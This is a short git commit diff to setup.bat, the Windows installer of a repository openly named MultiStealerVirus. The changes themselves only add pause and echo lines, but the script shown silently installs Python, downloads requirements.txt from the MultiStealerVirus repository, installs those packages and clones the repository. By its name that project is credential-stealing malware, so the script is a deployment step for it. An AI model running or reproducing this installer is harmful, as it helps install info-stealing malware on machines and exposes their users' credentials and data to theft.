82d7ba98eb54fa1c8070dd752ea14fe6131c24ca
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-22 14:11:30 +0200

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -6,8 +6,9 @@ if %errorlevel% neq 0 (
   echo Installing Python...
   powershell.exe -Command "& {Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile python-3.10.0-amd64.exe}"
   python-3.10.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
+  echo Python installed...
+  pause
 )
-
 
 echo Installing dependencies...
 powershell.exe -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/Josakko/MultiStealerVirus/main/requirements.txt -OutFile requirements.txt}"
@@ -15,7 +16,6 @@ pip install -r requirements.txt
 
 echo Installation complete!
 pause
-
 
 where git > nul
 if %errorlevel% neq 0 (
@@ -27,3 +27,4 @@ if %errorlevel% neq 0 (
 echo Cloning repository...
 git clone https://github.com/Josakko/MultiStealerVirus.git
 echo Setup complete!
+pause
